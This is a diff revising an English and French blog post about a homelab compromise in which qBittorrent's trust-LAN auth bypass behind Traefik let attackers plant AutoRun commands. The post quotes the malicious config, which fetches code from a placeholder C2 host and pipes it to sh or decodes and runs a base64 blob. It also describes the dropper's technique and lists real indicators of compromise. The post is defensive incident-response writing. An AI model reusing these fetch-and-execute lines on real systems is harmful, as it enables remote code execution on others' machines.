@@ -25,11 +25,11 @@ OnTorrentAdded\\Enabled=true
 OnTorrentAdded\\Program=sh -c "(curl -s http://&lt;c2-domain&gt; || wget -qO - http://&lt;c2-domain&gt;) | sh"
 enabled=true
 program="sh -c \\"echo &lt;base64-blob&gt; | base64 -d | sh\\""</code></pre>
-<p>Every torrent added → arbitrary remote code, executed inside the qBit container, with the qBit user's privileges and access to every bind mount and the VPN namespace. The <em>C2</em> — the attacker's command-and-control server, the address a compromised host calls home to for instructions — was alive. The <em>dropper</em> — the small first-stage script whose only job is to fetch and execute the real payload — had a last-modified two days before I found it. Caddy was happily serving it.</p>
+<p>Every new torrent meant remote code execution inside the qBit container. Full access to every mounted volume. Full access to the VPN tunnel. The <em>C2</em> (the attacker's control server, where a compromised host calls home for instructions) was still alive. The <em>dropper</em> (the small first-stage script that fetches and runs the real payload) had been served two days earlier. Caddy was still hosting it.</p>
 <p>I stopped the container.</p>
 
 <h2>The flaw is not qBittorrent. The flaw is the model.</h2>
-<p>Here is the part that matters, and it is why I am writing this post instead of pasting an <code>incident.md</code> into a private wiki and calling it a Tuesday.</p>
+<p>Here is the part that matters. It's why I'm writing this post instead of dropping an <code>incident.md</code> in a private wiki and calling it a Tuesday.</p>
 <p>qBittorrent has a setting called <code>WebUI\\AuthSubnetWhitelist</code>. It accepts a list of CIDRs. Requests from a source IP inside any of those CIDRs <strong>bypass authentication entirely.</strong> It defaults to off. I had it on, with the standard "I trust my LAN" CIDRs:</p>
 <pre><code>WebUI\\AuthSubnetWhitelist=10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
 WebUI\\AuthSubnetWhitelistEnabled=true</code></pre>
@@ -60,7 +60,9 @@ WebUI\\AuthSubnetWhitelistEnabled=true</code></pre>
 <text x="320" y="170" font-size="13" font-style="italic">qBittorrent sees Traefik's IP, not yours. Auth is skipped.</text>
 </g>
 </svg>
-<p>The deeper problem isn't qBit's setting. It is the entire mental model that produced it. <strong>"Trust the LAN" was a defensible default in 2010</strong>, when homelabs were physically air-gapped from the internet and "the network" meant a switch in your basement. In 2026, your "LAN" includes a reverse proxy that's reachable from anywhere on Earth, an SDN docker bridge that contains every container's outbound, an inbound tunnel from your CDN, your phone's Tailscale node sitting in a hotel WiFi, and a half-dozen automation users that exist to talk to your stuff over HTTP. <strong>The LAN is no longer a place. It is an implementation detail of where the auth check happens to fall.</strong></p>
+<p>The deeper problem isn't qBit's setting. It's the mental model behind it. <strong>"Trust the LAN" was a defensible default in 2010.</strong> Homelabs were air-gapped. "The network" meant a switch in your basement.</p>
+<p>In 2026, your "LAN" looks nothing like that. It includes a reverse proxy reachable from anywhere on Earth. A docker bridge that carries every container's traffic. A tunnel inbound from your CDN. Your phone's Tailscale node sitting in a hotel WiFi. Half a dozen automation users that talk to your stuff over HTTP.</p>
+<p><strong>The LAN is no longer a place.</strong> It's a coincidence of where your auth check happens to live.</p>
 <p>Self-hosted apps shipped permissive "LAN allow" defaults assuming a LAN nobody actually has anymore. Cloudflare Tunnel, Tailscale Funnel, Traefik, Caddy — they move the perimeter, they do not replace authn. The reverse proxy is a <em>hallway</em>, not a <em>door</em>.</p>
 
 <h2>The blast radius: I audited 40 services. 3 were wide open.</h2>
@@ -68,17 +70,17 @@ WebUI\\AuthSubnetWhitelistEnabled=true</code></pre>
 <p><strong>Three were unauthenticated to the internet.</strong></p>
 <ul>
 <li><strong>qBittorrent</strong> — already on fire. Trust-LAN bypass.</li>
-<li><strong>A real-time docker log viewer.</strong> No auth env, no middleware. Its <code>/api/events/stream</code> endpoint streamed the entire container fleet to anyone with the URL. The companion log endpoint streams stdout/stderr from any container the host runs. That includes every secret, token, request body, OAuth code, webhook signature, and database query that any service in the stack ever logs. <strong>A static dashboard with a hostname guessable from a TLS transparency feed gave a stranger a real-time <em>SIEM</em> (a security console that aggregates every log and event across an infrastructure into one searchable view) of my entire infra.</strong></li>
+<li><strong>A real-time docker log viewer.</strong> No auth, no middleware. Its <code>/api/events/stream</code> endpoint streamed the entire container fleet to anyone with the URL. The companion endpoint streams every container's stdout and stderr. Every secret, token, request body, OAuth code, webhook signature, database query — anything any service ever logged. <strong>A guessable hostname gave a stranger a real-time <em>SIEM</em> (a security console that aggregates an infrastructure's logs into one searchable view) over my entire stack.</strong></li>
 <li><strong>A Plex statistics dashboard.</strong> Empty <code>http_password=""</code> in its config. The full Home view was a <code>GET /home</code> away. Watch history, IP addresses of every viewer, embedded Plex auth tokens, notification webhooks (Discord, Slack — with their secrets in the payload).</li>
 </ul>
 <p>Each of those was one URL guess away. Each was visible from any TLS transparency monitor — <a target="_blank" rel="noopener noreferrer" href="https://crt.sh">crt.sh</a> will happily list every subdomain on a wildcard cert. And each had its own native auth that I had explicitly turned off because — wait for it — <strong>"it's only on the LAN."</strong></p>
-<p>The compromise blast radius wasn't qBittorrent. It was every secret my stack had ever leaked into a log line. Container escape was unlikely (no privileged, no docker socket). Lateral movement via shared volumes was on the table. Sustained C2 traffic exited via my paid VPN — meaning my legal exposure was the VPN provider's egress IP, not mine. Cold comfort.</p>
-<p>Severity, called honestly: <strong>high impact, low sophistication.</strong> The dropper has the fingerprints of the long-running cryptominer campaigns that have been hammering qBit AutoRun since 2023. Multi-arch (x86_64 / aarch64 / amd64), 8-character random binary names, drop → <code>chmod +x</code> → execute → <code>rm -rf</code> to leave nothing on disk, multi-tool downloader fallbacks (curl → wget → python3 → perl HTTP::Tiny → raw <code>IO::Socket::INET</code>). The operator wasn't targeting me. They were spraying every qBit on the public internet with the AutoRun feature available. I was a number in a list.</p>
+<p>The blast radius wasn't qBittorrent. It was every secret my stack had ever leaked into a log line. Container escape was unlikely (no privileged, no docker socket). Lateral movement via shared volumes was on the table. The C2 traffic exited via my paid VPN, so my legal exposure was the VPN provider's IP, not mine. Cold comfort.</p>
+<p>Severity, honestly: <strong>high impact, low sophistication.</strong> The dropper carries the fingerprints of the cryptominer campaigns that have been hammering qBit AutoRun since 2023. Multi-arch binaries (x86_64, aarch64, amd64). Random 8-character names. Drop, <code>chmod +x</code>, execute, <code>rm -rf</code> — nothing left on disk. Multiple downloader fallbacks: curl, wget, python3, perl, raw sockets. The operator wasn't targeting me. They were spraying every qBit on the public internet with AutoRun on. I was a number in a list.</p>
 <p>The same primitive in skilled hands gets a lot worse. The shared <code>/data/downloads</code> mount runs straight into Plex's process. The arr stack's API keys sit in env files on the same box. The lesson isn't that I dodged a bullet — it is that the bullet was generic, and a custom one would have been catastrophic.</p>
 
 <h2>What "behind Traefik" actually means</h2>
 <p>Read any homelab tutorial from the last five years. The instructions follow a pattern: deploy the service, point Traefik at it with a <code>Host()</code> rule, get a Let's Encrypt cert, done. The implicit assumption is that Traefik is a security boundary.</p>
-<p>It isn't. Traefik is a <em>router</em>. By default it routes whatever it can reach to whoever asks for it. If the upstream service has auth, requests get authenticated. If it doesn't, they don't. Traefik will happily proxy an unauthenticated dashboard to the public internet for years and never warn you, because that is <strong>literally what you configured it to do.</strong></p>
+<p>It isn't. Traefik is a <em>router</em>. By default, it routes whatever it can reach to whoever asks for it. If the upstream service has auth, requests get authenticated. If it doesn't, they don't. Traefik will happily proxy an unauthenticated dashboard to the public internet for years. It will never warn you. <strong>That's literally what you configured it to do.</strong></p>
 <p>The mental fix is to treat the reverse proxy as untrusted infrastructure that <em>forwards</em> traffic. The auth boundary is the application's auth, or a forwardAuth middleware in front of it. <strong>There is no third option.</strong> "Reachable on the LAN only" is the second option pretending to be a third one. If your reverse proxy can reach the upstream, and the public internet can reach your reverse proxy, the upstream is on the public internet.</p>
 <p>This generalizes. The same trap exists in:</p>
 <ul>
@@ -142,10 +144,17 @@ WebUI\\AuthSubnetWhitelistEnabled=true</code></pre>
 <p>A single layer would be a checkbox. Three layers is defense-in-depth that accepts any one of them might be wrong.</p>
 
 <h3>Sanitize and audit</h3>
-<p>For the compromised app: I deleted the <code>[AutoRun]</code> block, turned off the trust-LAN bypass, rotated the WebUI password (generating the salted hash myself rather than clicking the UI form — at least then I know what's in my config), kept a forensic copy of the config and the dropper, and scanned the container's running processes for a tell-tale sign of the malware:</p>
+<p>For the compromised app, I did five things:</p>
+<ul>
+<li>Deleted the <code>[AutoRun]</code> block.</li>
+<li>Turned off the trust-LAN bypass.</li>
+<li>Rotated the WebUI password. I generated the salted hash myself instead of clicking the UI form — at least then I know what's in my config.</li>
+<li>Kept a forensic copy of the config and the dropper.</li>
+<li>Scanned the container's running processes for a tell-tale sign of the malware:</li>
+</ul>
 <pre><code>ls -la /proc/*/exe 2&gt;/dev/null | grep deleted</code></pre>
 <p>That command lists running processes whose executable on disk has already been deleted — the classic fingerprint of "drop, run, delete" malware that tries to leave nothing behind. Nothing showed up. The dropper had done its job and exited cleanly when I stopped the container.</p>
-<p>For everything else: I walked every service exposed through Traefik, noted which ones had an auth gate in front and which were relying on their own internal login. Three had no auth at all. The rest were either fine on their own merits or <em>arguably</em> fine for their threat model — and <em>arguably</em> is doing work in that sentence. See the next section.</p>
+<p>For everything else, I walked every service exposed through Traefik. I noted which had an auth gate in front and which relied on their own internal login. Three had no auth at all. The rest were either fine on their own merits, or <em>arguably</em> fine for their threat model. <em>Arguably</em> is doing a lot of work in that sentence. See the next section.</p>
 
 <h3>Default-deny the perimeter</h3>
 <p>The honest fix isn't "secure the three I missed." It is "stop trusting that I will catch the next one." So I put a small auth service in front of every service whose only intended user is <em>me</em>: <a target="_blank" rel="noopener noreferrer" href="https://github.com/steveiliop56/tinyauth">TinyAuth</a> (minimal, single-purpose, fits the blast radius I needed; <a target="_blank" rel="noopener noreferrer" href="https://www.authelia.com/">Authelia</a> or <a target="_blank" rel="noopener noreferrer" href="https://goauthentik.io/">Authentik</a> would do as well). Now Traefik asks the auth service "is this person logged in?" before forwarding any request to the actual app. That covered <strong>17 admin UIs</strong>. Even if the app behind has an unauthenticated bug — and someday one will — the request never reaches it without a valid session first.</p>
@@ -178,7 +187,7 @@ WebUI\\AuthSubnetWhitelistEnabled=true</code></pre>
 <text x="384" y="258">Login page</text>
 </g>
 </svg>
-<p>Services that <em>do</em> need to talk to third parties (mobile apps, SDKs, CLIs, webhooks from external systems, password manager clients, photo-sync clients) stayed on their own auth, with the explicit understanding that I owe each of them a much closer look. That list is shorter than the gated list, and every entry on it is a known weak point I'm now actively monitoring.</p>
+<p>Some services <em>do</em> need to talk to third parties — mobile apps, SDKs, CLIs, external webhooks, password manager clients, photo sync. Those stayed on their own auth. Each one is now a known weak point I monitor actively. The list is much shorter than the gated one.</p>
 <p>The rule going forward is one line in any new service's compose file:</p>
 <pre><code>- "traefik.http.routers.&lt;name&gt;.middlewares=tinyauth@docker"</code></pre>
 <p>If a new service can't accept that line, that's a deliberate exception, not a default.</p>
@@ -210,7 +219,7 @@ done</code></pre>
 <p>And: <strong>do not trust your monitoring to catch this for you.</strong> I had Beszel, Uptime Kuma, Dozzle, Pi-hole's query log, the lot. None of them flagged anything because nothing was <em>failing</em>. The compromise was inside the application, and the application was working <em>better</em> than usual from the attacker's perspective. The signal that found it was visual: a red icon I happened to look at. There is no SIEM in a homelab. You are the SIEM, and your eyes are not a query language.</p>
 
 <h2>Indicators of compromise</h2>
-<p>If you run qBittorrent and want to confirm you weren't hit by the same wave, here's what to look for. These are the <em>IoCs</em> (Indicators of Compromise — the specific artifacts a defender can grep for to confirm a known intrusion) from this incident; they're public defenders' information.</p>
+<p>If you run qBittorrent and want to confirm you weren't hit by the same wave, here's what to look for. These are the <em>IoCs</em> from this incident — Indicators of Compromise, the specific artifacts a defender can grep for to confirm a known intrusion. They're public defenders' information.</p>
 <ul>
 <li><strong>C2 domain:</strong> <code>yify.foo</code></li>
 <li><strong>C2 IP:</strong> <code>172.245.88.160</code> (ColoCrossing, the same range that hosts a long list of similar mass-exploitation droppers)</li>
@@ -219,7 +228,15 @@ done</code></pre>
 <li><strong>Process IoC:</strong> <code>ls -la /proc/*/exe 2&gt;/dev/null | grep deleted</code> — fileless stage-2 process whose binary inode is gone</li>
 <li><strong>Network IoC:</strong> outbound DNS for <code>yify.foo</code> or any TCP to <code>172.245.88.160</code> from a container running qBit, sonarr, radarr, plex, or anything sharing their volumes</li>
 </ul>
-<p>If you find any of these, treat the host as compromised: stop the affected container, sanitize the config, rotate every credential the container had access to, block the C2 at three layers (DNS, host, edge), and audit the rest of your stack for the same pattern. Don't just kill the process — that's stage 2, the autorun config will respawn it on the next torrent add.</p>
+<p>If you find any of these, treat the host as compromised. Then:</p>
+<ul>
+<li>Stop the affected container.</li>
+<li>Sanitize the config.</li>
+<li>Rotate every credential the container had access to.</li>
+<li>Block the C2 at three layers (DNS, host, edge).</li>
+<li>Audit the rest of your stack for the same pattern.</li>
+</ul>
+<p>Don't just kill the process. That's the stage-2 dropper. The autorun config will respawn it on the next torrent.</p>
 
 <h2>Closing</h2>
 <p>I have spent 9 years writing software for hospitals. I hold opinions about systems with strong consequences. I still got owned by a default checkbox.</p>
@@ -245,11 +262,11 @@ OnTorrentAdded\\Enabled=true
 OnTorrentAdded\\Program=sh -c "(curl -s http://&lt;c2-domain&gt; || wget -qO - http://&lt;c2-domain&gt;) | sh"
 enabled=true
 program="sh -c \\"echo &lt;base64-blob&gt; | base64 -d | sh\\""</code></pre>
-<p>Chaque torrent ajouté → exécution de code distant arbitraire, à l'intérieur du conteneur qBit, avec les privilèges de l'utilisateur qBit et l'accès à chaque bind mount et au namespace VPN. Le <em>C2</em> — le serveur de <em>command-and-control</em> de l'attaquant, l'adresse vers laquelle un hôte compromis appelle pour recevoir ses instructions — était vivant. Le <em>dropper</em> — le petit script de première étape dont le seul rôle est de récupérer et d'exécuter la vraie charge utile — avait un last-modified à deux jours avant que je le trouve. Caddy le servait tranquillement.</p>
+<p>Chaque nouveau torrent voulait dire exécution de code distant à l'intérieur du conteneur qBit. Accès complet à chaque volume monté. Accès complet au tunnel VPN. Le <em>C2</em> (le serveur de contrôle de l'attaquant, l'endroit où un hôte compromis appelle pour recevoir ses instructions) était toujours en ligne. Le <em>dropper</em> (le petit script de première étape qui télécharge et exécute la vraie charge utile) avait été servi deux jours plus tôt. Caddy l'hébergeait encore.</p>
 <p>J'ai stoppé le conteneur.</p>
 
 <h2>Le défaut n'est pas dans qBittorrent. Il est dans le modèle.</h2>
-<p>Voilà la partie qui compte, et c'est pour ça que j'écris cet article au lieu de coller un <code>incident.md</code> dans un wiki privé et de passer à autre chose.</p>
+<p>Voilà la partie qui compte. C'est pour ça que j'écris cet article au lieu de coller un <code>incident.md</code> dans un wiki privé et de passer à autre chose.</p>
 <p>qBittorrent a un paramètre <code>WebUI\\AuthSubnetWhitelist</code>. Il accepte une liste de CIDR. Les requêtes dont l'IP source est dans un de ces CIDR <strong>contournent l'authentification entièrement.</strong> C'est désactivé par défaut. Je l'avais activé, avec les CIDR "je fais confiance au LAN" classiques :</p>
 <pre><code>WebUI\\AuthSubnetWhitelist=10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
 WebUI\\AuthSubnetWhitelistEnabled=true</code></pre>
@@ -280,7 +297,9 @@ WebUI\\AuthSubnetWhitelistEnabled=true</code></pre>
 <text x="320" y="170" font-size="13" font-style="italic">qBit voit l'IP de Traefik, pas la vôtre. L'auth est zappée.</text>
 </g>
 </svg>
-<p>Le problème plus profond n'est pas le paramètre de qBit. C'est le modèle mental entier qui l'a produit. <strong>"Faire confiance au LAN" était une option par défaut défendable en 2010</strong>, quand les homelabs étaient physiquement séparés d'internet et que "le réseau" voulait dire un switch dans le sous-sol. En 2026, votre "LAN" comprend un reverse proxy joignable depuis n'importe où sur la planète, un bridge docker SDN qui contient le sortant de chaque conteneur, un tunnel entrant depuis votre CDN, le node Tailscale de votre téléphone posé dans le WiFi d'un hôtel, et une demi-douzaine d'utilisateurs d'automatisation qui existent juste pour parler à vos services en HTTP. <strong>Le LAN n'est plus un endroit. C'est un détail d'implémentation sur le lieu où la vérification d'auth se trouve.</strong></p>
+<p>Le problème plus profond n'est pas le paramètre de qBit. C'est le modèle mental qui l'a produit. <strong>"Faire confiance au LAN" était une option défendable en 2010.</strong> Les homelabs étaient air-gappés. "Le réseau" voulait dire un switch dans le sous-sol.</p>
+<p>En 2026, votre "LAN" ne ressemble plus à ça. Il comprend un reverse proxy joignable depuis n'importe où sur la planète. Un bridge docker qui transporte le trafic de chaque conteneur. Un tunnel entrant depuis votre CDN. Le node Tailscale de votre téléphone posé dans le WiFi d'un hôtel. Une demi-douzaine d'utilisateurs d'automatisation qui parlent à vos services en HTTP.</p>
+<p><strong>Le LAN n'est plus un endroit.</strong> C'est une coïncidence : l'endroit où votre vérification d'auth se trouve.</p>
 <p>Les applis self-hosted ont livré des défauts permissifs "autoriser le LAN" en supposant un LAN que plus personne n'a. Cloudflare Tunnel, Tailscale Funnel, Traefik, Caddy — ils déplacent le périmètre, ils ne remplacent pas l'authn. Le reverse proxy est un <em>couloir</em>, pas une <em>porte</em>.</p>
 
 <h2>Le rayon d'explosion : 40 services audités. 3 grands ouverts.</h2>
@@ -288,17 +307,17 @@ WebUI\\AuthSubnetWhitelistEnabled=true</code></pre>
 <p><strong>Trois étaient sans authentification depuis internet.</strong></p>
 <ul>
 <li><strong>qBittorrent</strong> — déjà en feu. Contournement trust-LAN.</li>
-<li><strong>Un visualiseur de logs docker en temps réel.</strong> Pas de variable d'env d'auth, pas de middleware. Son endpoint <code>/api/events/stream</code> diffusait toute la flotte de conteneurs à quiconque connaissait l'URL. L'endpoint compagnon de logs streame les stdout/stderr de n'importe quel conteneur tournant sur l'hôte. Ça inclut chaque secret, token, request body, code OAuth, signature de webhook et requête de base de données que n'importe quel service du stack a un jour loggué. <strong>Un dashboard statique avec un hostname devinable depuis un flux TLS transparency a donné à un inconnu un <em>SIEM</em> (une console de sécurité qui agrège chaque log et événement d'une infrastructure en une vue interrogeable unique) en temps réel de toute mon infra.</strong></li>
+<li><strong>Un visualiseur de logs docker en temps réel.</strong> Pas d'auth, pas de middleware. Son endpoint <code>/api/events/stream</code> diffusait toute la flotte de conteneurs à quiconque connaissait l'URL. L'endpoint compagnon streame les stdout et stderr de chaque conteneur. Chaque secret, token, request body, code OAuth, signature de webhook, requête de base — tout ce qu'un service a un jour loggué. <strong>Un hostname devinable a donné à un inconnu un <em>SIEM</em> (une console de sécurité qui agrège les logs d'une infra en une vue interrogeable unique) en temps réel sur tout mon stack.</strong></li>
 <li><strong>Un dashboard de statistiques Plex.</strong> <code>http_password=""</code> vide dans sa config. La vue Home complète était à un <code>GET /home</code> de distance. Historique de visionnage, IPs de chaque viewer, tokens d'auth Plex embarqués, webhooks de notification (Discord, Slack — avec leurs secrets dans le payload).</li>
 </ul>
 <p>Chacun était à un guess d'URL près. Chacun était visible depuis n'importe quel monitor TLS transparency — <a target="_blank" rel="noopener noreferrer" href="https://crt.sh">crt.sh</a> liste volontiers chaque sous-domaine sur un certificat wildcard. Et chacun avait sa propre auth native que j'avais explicitement désactivée parce que — attendez — <strong>"c'est juste sur le LAN."</strong></p>
-<p>Le rayon d'explosion du compromis n'était pas qBittorrent. C'était chaque secret que mon stack avait jamais laissé fuiter dans une ligne de log. Une évasion de conteneur était peu probable (pas de privileged, pas de socket docker). Un mouvement latéral via volumes partagés était sur la table. Le trafic C2 sortait via mon VPN payant — donc mon exposition légale était l'IP de sortie du fournisseur VPN, pas la mienne. Maigre consolation.</p>
-<p>Sévérité, dite honnêtement : <strong>impact élevé, sophistication faible.</strong> Le dropper a les empreintes des campagnes de cryptominers de longue date qui martèlent qBit AutoRun depuis 2023. Multi-arch (x86_64 / aarch64 / amd64), noms de binaire aléatoires de 8 caractères, drop → <code>chmod +x</code> → exécution → <code>rm -rf</code> pour ne rien laisser sur disque, fallbacks multi-outils pour le téléchargement (curl → wget → python3 → perl HTTP::Tiny → socket brut <code>IO::Socket::INET</code>). L'opérateur ne me ciblait pas. Il sprayait chaque qBit sur internet avec la fonctionnalité AutoRun disponible. J'étais un numéro dans une liste.</p>
+<p>Le rayon d'explosion n'était pas qBittorrent. C'était chaque secret que mon stack avait un jour laissé fuiter dans une ligne de log. Une évasion de conteneur était peu probable (pas de privileged, pas de socket docker). Un mouvement latéral via volumes partagés était sur la table. Le trafic C2 sortait via mon VPN payant, donc mon exposition légale était l'IP du fournisseur VPN, pas la mienne. Maigre consolation.</p>
+<p>Sévérité, honnêtement : <strong>impact élevé, sophistication faible.</strong> Le dropper porte les empreintes des campagnes de cryptominers qui martèlent qBit AutoRun depuis 2023. Binaires multi-arch (x86_64, aarch64, amd64). Noms aléatoires de 8 caractères. Drop, <code>chmod +x</code>, exécution, <code>rm -rf</code> — rien ne reste sur disque. Plusieurs téléchargeurs en fallback : curl, wget, python3, perl, sockets bruts. L'opérateur ne me ciblait pas. Il sprayait chaque qBit sur internet avec AutoRun activé. J'étais un numéro dans une liste.</p>
 <p>Le même primitive entre des mains qualifiées devient bien pire. Le mount partagé <code>/data/downloads</code> tape direct dans le process Plex. Les clés API du stack arr sont dans des fichiers env sur la même box. La leçon n'est pas que j'ai esquivé une balle — c'est que la balle était générique, et qu'une balle sur mesure aurait été catastrophique.</p>
 
 <h2>Ce que "derrière Traefik" veut vraiment dire</h2>
 <p>Lisez n'importe quel tuto homelab des cinq dernières années. Les instructions suivent un schéma : déployer le service, pointer Traefik dessus avec une règle <code>Host()</code>, récupérer un certificat Let's Encrypt, fini. La supposition implicite, c'est que Traefik est une frontière de sécurité.</p>
-<p>Ce n'est pas le cas. Traefik est un <em>routeur</em>. Par défaut il route ce qu'il peut atteindre vers qui le demande. Si le service en amont a une auth, les requêtes sont authentifiées. Sinon, non. Traefik continuera de proxy un dashboard non authentifié vers internet pendant des années sans jamais vous prévenir, parce que c'est <strong>littéralement ce que vous lui avez configuré de faire.</strong></p>
+<p>Ce n'est pas le cas. Traefik est un <em>routeur</em>. Par défaut, il route ce qu'il peut atteindre vers qui le demande. Si le service en amont a une auth, les requêtes sont authentifiées. Sinon, non. Traefik continuera de proxy un dashboard non authentifié vers internet pendant des années. Il ne vous préviendra jamais. <strong>C'est littéralement ce que vous lui avez configuré de faire.</strong></p>
 <p>La correction mentale est de traiter le reverse proxy comme une infrastructure non fiable qui <em>transfère</em> du trafic. La frontière d'auth, c'est l'auth de l'application, ou un middleware forwardAuth devant. <strong>Il n'y a pas de troisième option.</strong> "Joignable seulement sur le LAN" est la deuxième option qui se fait passer pour une troisième. Si votre reverse proxy peut atteindre l'amont, et que l'internet public peut atteindre votre reverse proxy, l'amont est sur l'internet public.</p>
 <p>Ça se généralise. Le même piège existe dans :</p>
 <ul>
@@ -362,10 +381,17 @@ WebUI\\AuthSubnetWhitelistEnabled=true</code></pre>
 <p>Une seule couche serait une case à cocher. Trois couches, c'est de la défense en profondeur qui accepte qu'une d'elles peut être fausse.</p>
 
 <h3>Sanitiser et auditer</h3>
-<p>Pour l'appli compromise : j'ai supprimé le bloc <code>[AutoRun]</code>, désactivé le bypass trust-LAN, fait la rotation du mot de passe WebUI (en générant le hash salé moi-même plutôt qu'en cliquant dans le formulaire UI — au moins je sais ce qui est dans ma config), gardé une copie forensique de la config et du dropper, et scanné les process du conteneur à la recherche d'un signe révélateur du malware :</p>
+<p>Pour l'appli compromise, j'ai fait cinq choses :</p>
+<ul>
+<li>Supprimé le bloc <code>[AutoRun]</code>.</li>
+<li>Désactivé le bypass trust-LAN.</li>
+<li>Tourné le mot de passe WebUI. J'ai généré le hash salé moi-même au lieu de cliquer dans le formulaire UI — au moins je sais ce qui est dans ma config.</li>
+<li>Gardé une copie forensique de la config et du dropper.</li>
+<li>Scanné les process du conteneur à la recherche d'un signe révélateur du malware :</li>
+</ul>
 <pre><code>ls -la /proc/*/exe 2&gt;/dev/null | grep deleted</code></pre>
 <p>Cette commande liste les process en cours dont l'exécutable sur disque a déjà été supprimé — la signature classique du malware "dépose, exécute, efface" qui essaie de ne rien laisser derrière. Rien n'est apparu. Le dropper avait fait son boulot et était sorti proprement quand le conteneur s'est arrêté.</p>
-<p>Pour le reste : j'ai parcouru chaque service exposé via Traefik, en notant lesquels avaient une barrière d'auth devant et lesquels comptaient sur leur propre login interne. Trois n'avaient aucune auth. Le reste était soit propre par ses propres mérites soit <em>défendable</em> pour son threat model — et <em>défendable</em> fait du travail dans cette phrase. Voir la section suivante.</p>
+<p>Pour le reste, j'ai parcouru chaque service exposé via Traefik. J'ai noté lesquels avaient une barrière d'auth devant et lesquels comptaient sur leur propre login interne. Trois n'avaient aucune auth. Le reste était soit propre par ses propres mérites, soit <em>défendable</em> pour son threat model. <em>Défendable</em> fait beaucoup de travail dans cette phrase. Voir la section suivante.</p>
 
 <h3>Default-deny au périmètre</h3>
 <p>La correction honnête n'est pas "sécuriser les trois que j'ai ratés." C'est "arrêter de faire confiance au fait que je rattraperai le suivant." Donc j'ai mis un petit service d'auth devant chaque service dont le seul utilisateur prévu c'est <em>moi</em> : <a target="_blank" rel="noopener noreferrer" href="https://github.com/steveiliop56/tinyauth">TinyAuth</a> (minimal, mono-tâche, taille de blast radius dont j'avais besoin ; <a target="_blank" rel="noopener noreferrer" href="https://www.authelia.com/">Authelia</a> ou <a target="_blank" rel="noopener noreferrer" href="https://goauthentik.io/">Authentik</a> feraient aussi l'affaire). Maintenant Traefik demande au service d'auth "est-ce que cette personne est connectée ?" avant de transmettre la requête à l'appli derrière. Ça couvre <strong>17 interfaces d'admin</strong>. Même si l'appli derrière a un bug d'auth — et ça finira par arriver — la requête ne l'atteint jamais sans une session valide.</p>
@@ -398,7 +424,7 @@ WebUI\\AuthSubnetWhitelistEnabled=true</code></pre>
 <text x="384" y="258">Page de login</text>
 </g>
 </svg>
-<p>Les services qui <em>ont besoin</em> de parler à des tiers (apps mobiles, SDKs, CLIs, webhooks d'origine externe, clients de gestionnaires de mot de passe, clients de sync photos) sont restés sur leur propre auth, avec la compréhension explicite que je leur dois à chacun un examen bien plus serré. Cette liste est plus courte que la liste des services barrés, et chaque entrée est un point faible connu que je surveille activement maintenant.</p>
+<p>Certains services <em>ont besoin</em> de parler à des tiers — apps mobiles, SDKs, CLIs, webhooks externes, clients de gestionnaires de mots de passe, sync photos. Ceux-là sont restés sur leur propre auth. Chacun est désormais un point faible connu que je surveille activement. La liste est bien plus courte que celle des services barrés.</p>
 <p>La règle pour la suite, c'est une ligne dans le compose de tout nouveau service :</p>
 <pre><code>- "traefik.http.routers.&lt;name&gt;.middlewares=tinyauth@docker"</code></pre>
 <p>Si un nouveau service ne peut pas accepter cette ligne, c'est une exception délibérée, pas un défaut.</p>
@@ -431,7 +457,7 @@ done</code></pre>
 <p>Et : <strong>ne faites pas confiance à votre monitoring pour rattraper ça à votre place.</strong> J'avais Beszel, Uptime Kuma, Dozzle, le query log de Pi-hole, tout. Aucun n'a tiqué parce que rien ne <em>ratait</em>. Le compromis était à l'intérieur de l'application, et l'application tournait <em>mieux</em> que d'habitude du point de vue de l'attaquant. Le signal qui a trouvé ça, c'était visuel : une icône rouge que j'ai regardée par hasard. Il n'y a pas de SIEM dans un homelab. Vous êtes le SIEM, et vos yeux ne sont pas un langage de requête.</p>
 
 <h2>Indicateurs de compromis</h2>
-<p>Si vous faites tourner qBittorrent et voulez confirmer que vous n'avez pas été touché par la même vague, voilà ce qu'il faut chercher. Ce sont les <em>IoCs</em> (Indicators of Compromise — les artefacts précis qu'un défenseur peut grepper pour confirmer une intrusion connue) de cet incident ; c'est de l'information défenseurs publique.</p>
+<p>Si vous faites tourner qBittorrent et voulez confirmer que vous n'avez pas été touché par la même vague, voilà ce qu'il faut chercher. Ce sont les <em>IoCs</em> de cet incident — Indicators of Compromise, les artefacts précis qu'un défenseur peut grepper pour confirmer une intrusion connue. C'est de l'information défenseurs publique.</p>
 <ul>
 <li><strong>Domaine C2 :</strong> <code>yify.foo</code></li>
 <li><strong>IP C2 :</strong> <code>172.245.88.160</code> (ColoCrossing, la même plage qui héberge une longue liste de droppers de mass-exploitation similaires)</li>
@@ -440,7 +466,15 @@ done</code></pre>
 <li><strong>IoC process :</strong> <code>ls -la /proc/*/exe 2&gt;/dev/null | grep deleted</code> — process stage-2 fileless dont l'inode du binaire est manquant</li>
 <li><strong>IoC réseau :</strong> DNS sortant pour <code>yify.foo</code> ou tout TCP vers <code>172.245.88.160</code> depuis un conteneur qui fait tourner qBit, sonarr, radarr, plex, ou tout ce qui partage leurs volumes</li>
 </ul>
-<p>Si vous trouvez l'un de ces, traitez l'hôte comme compromis : arrêtez le conteneur affecté, sanitisez la config, faites une rotation de chaque credential auquel le conteneur avait accès, bloquez le C2 sur trois couches (DNS, hôte, edge), et auditez le reste de votre stack pour le même pattern. Ne tuez pas juste le process — c'est le stage 2, la config autorun le respawnera au prochain torrent ajouté.</p>
+<p>Si vous en trouvez un, traitez l'hôte comme compromis. Ensuite :</p>
+<ul>
+<li>Arrêtez le conteneur affecté.</li>
+<li>Sanitisez la config.</li>
+<li>Faites une rotation de chaque credential auquel le conteneur avait accès.</li>
+<li>Bloquez le C2 sur trois couches (DNS, hôte, edge).</li>
+<li>Auditez le reste de votre stack pour le même pattern.</li>
+</ul>
+<p>Ne tuez pas juste le process. C'est le stage-2 dropper. La config autorun le respawnera au prochain torrent.</p>
 
 <h2>Conclusion</h2>
 <p>J'ai passé 9 ans à écrire du logiciel pour des hôpitaux. J'ai des opinions sur les systèmes à fortes conséquences. Je me suis quand même fait avoir par une case à cocher par défaut.</p>
